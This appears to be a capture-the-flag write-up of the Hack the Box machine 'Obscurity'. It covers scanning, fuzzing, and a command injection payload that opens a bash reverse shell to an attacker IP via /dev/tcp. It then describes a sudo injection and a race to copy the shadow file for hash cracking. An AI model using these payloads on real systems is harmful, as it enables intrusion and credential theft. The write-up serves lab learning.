+++
author = "Nick"
categories = ["hack the box", "burpsuite", "command injection", "reverse shell", "python", "custom exploitation", "medium", "wfuzz", "john"]
date = 2020-05-09T14:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/12/info.png"
slug = "hack-the-box-obscurity"
summary = "Welcome back everyone! Today we'll be doing the machine Obscurity on Hack the Box. It's listed as a medium Linux machine, let's jump in!"
tags = ["hack the box", "burpsuite", "command injection", "reverse shell", "python", "custom exploitation", "medium", "wfuzz", "john"]
title = "Hack the Box - Obscurity"

+++


Welcome back everyone! Today we'll be doing the machine Obscurity on Hack the Box. It's listed as a medium Linux machine, let's jump in!

As usual we start with ```nmap```: ```nmap -sC -sV -T4 -p- -oA initial_scan 10.10.10.168```.

Here are our results:
```
Nmap scan report for 10.10.10.168
Host is up (0.055s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 23 Dec 2019 14:38:24
|     Server: BadHTTPServer
|     Last-Modified: Mon, 23 Dec 2019 14:38:24
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=12/23%Time=5E00D11F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Mon,\x2023\x20Dec\x202
SF:019\x2014:38:24\nServer:\x20BadHTTPServer\nLast-Modified:\x20Mon,\x2023
SF:\x20Dec\x202019\x2014:38:24\nContent-Length:\x204171\nContent-Type:\x20
SF:text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\
SF:"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>
SF:\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20n
SF:ame=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Temp
SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20s
SF:tylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/bo
SF:otstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-
SF:awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templ
SF:atemo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-targe
SF:t=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n
SF:<div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinne
SF:r-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x2
SF:0Mon,\x2023\x20Dec\x202019\x2014:38:24\nServer:\x20BadHTTPServer\nLast-
SF:Modified:\x20Mon,\x2023\x20Dec\x202019\x2014:38:24\nContent-Length:\x20
SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x2
SF:0html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\
SF:t<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20cont
SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
SF:sk-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our results seem to show a web server with a production and dev enviornment. Looks like we're running ```Wordpress``` on the 9000 port as well. Let's visit the site and see what's here. We know port 80 is closed but 8080 is running and we are greeted a basic page. From browsing the page we get a hostname, obscure.htb, so we'll add that to our host file. We also know there are some more settings listed in a secret development directory somewhere. So we'll load up ```gobuster``` and see what we get back.

Command:
```gobuster dir -u http://obscure.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 75```

When we run this we get a flood of errors back. This is to do ```gobuster``` using ```Head``` requests vs ```get```. Well, we know that we are looking for ```SuperSecureServer.py```. We can just fuzz the directory(ies) we are looking for using ```ffuf``` or ```wfuzz```.

Command:
```wfuzz -c -w /usr/share/wordlists/dirb/small.txt --hc 404 'http://obscure.htb:8080/FUZZ/SuperSecureServer.py'```

I ran a few larger wordlists against the target but all of them failing after ~2,200 requests. So we pick an even smaller listing.

![](/images/2019/12/obscurity_fuzz.gif)

We find our target is stored under ```develop```. Lets get the file.

Command: 
```wget 'http://obscure.htb:8080/develop/SuperSecureServer.py'```

Once we have it downloaded, we look at what's inside.

![](/images/2019/12/image-40.png)

We found our foothold. If we are able to pass our command and escape the first part, we should be able to execute some python code we inject. We need to make sure we format our request correctly. We want to close the first part of the ommand with ```';``` then execute our code and close the command. I used a simple bash reverse shell:

```
;os.system('bash%20-c%20"bash%20-i%20>&%20/dev/tcp/10.10.15.129/4444%200>&1"');'
```

We apply this to our URL and wait for our connector...

![](/images/2019/12/obscurity_www_shell.gif)

We now have a shell as ```www-data```. Now that we have a shell we can start enumerating internally. We see a few files in ```Robert```'s home directory. ```SuperSecureCrypt.py``` and ```passwordreminder.txt```. We download the python script and look at it locally. It looks to contain an [```Vigenere cipher```](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) method. If you are familiar with this cipher you know that we can obtain the password for the file if you know the original input.

![](/images/2019/12/obscurity_key.gif)

It looks like our password was ```alexandrovich```. We can now take this password and decrypt our ```passwordreminder.txt```. Repeating the process but supplying a ```-k``` of ```alexanderovich``` gives us a password of ```SecThruObsFTW```. Which assumably is Robert's password. We try to SSH as him and it works.

![](/images/2019/12/obscurity_robert_ssh-1.gif)

Now that we've gotten our ```user.txt```. Lets start enumerating as Robert. We see that Robert is able to launch ```BetterSSH.py``` as sudo.

![](/images/2019/12/image-41.png)

When we look through ```BetterSSH.py``` we see there are a few avenue's of attack. The first being this ```command injection```.

![](/images/2019/12/image-42.png)

The application calls the command you input with the ```-u``` flag. So if we simply apply another ```-u``` to our input, we can do things as ```root```!

![](/images/2019/12/obscurity_root_1.gif)

The other method is that we see that copies the system shadow file out to a temporary directory every .1 seconds. If we can monitor this file location, we can snag the file before it's deleted. So we'll make a file on ```/tmp``` called snag. Then we'll run the ```watch``` command every .1 seconds. We then run the ```BetterSSH.py``` script and snag the file before it's created.

Command:
```watch -n .1 cp /tmp/SSH/* /tmp/snag```

![](/images/2019/12/obscurit_root_2.gif)

We can then get the contents of the file we copied. Inside it we have the root hash.

![](/images/2019/12/image-43.png)

We can just run it through ```John``` and see if we get a password.

![](/images/2019/12/obscurity_root_hash-1.gif)

Sure enough, we get one: ```mercedes```. We can now just ```su``` to root.

![](/images/2019/12/obscurity_root_su.gif)

There we have it. Another box down!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

